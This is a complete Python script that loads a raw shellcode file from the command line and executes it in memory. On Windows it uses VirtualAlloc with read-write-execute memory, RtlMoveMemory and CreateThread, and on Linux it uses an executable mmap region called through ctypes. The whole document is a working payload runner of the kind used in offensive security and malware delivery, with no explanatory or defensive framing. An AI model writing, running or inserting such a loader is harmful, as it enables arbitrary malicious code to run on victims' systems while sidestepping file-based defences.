import sys
import ctypes
import mmap
import platform

def execute_shellcode(shellcode_bytes):
    system_os = platform.system().lower()

    print(f"[*] Executing shellcode ({len(shellcode_bytes)} bytes)...")

    if "windows" in system_os:
        ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode_bytes), 0x3000, 0x40)
        ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode_bytes, len(shellcode_bytes))
        handle = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
        ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

    elif "linux" in system_os:
        mem = mmap.mmap(-1, len(shellcode_bytes), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        mem.write(shellcode_bytes)
        ctypes_buffer = ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mem)))
        shell_func = ctypes.CFUNCTYPE(None)(ctypes_buffer.value)
        shell_func()
    else:
        print("[!] Unsupported operating system.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} shellcode.bin")
        sys.exit(1)

    with open(sys.argv[1], "rb") as f:
        shellcode = f.read()
        execute_shellcode(shellcode)
